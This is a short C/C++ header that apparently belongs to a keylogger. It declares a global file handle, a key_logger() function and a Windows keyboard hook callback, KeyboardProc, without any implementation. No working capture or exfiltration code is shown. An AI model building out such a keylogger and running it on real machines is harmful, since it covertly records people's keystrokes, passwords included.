#pragma once
#include "utilities.h"


HANDLE file_handle;


// function .....
int key_logger();

// function.....
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);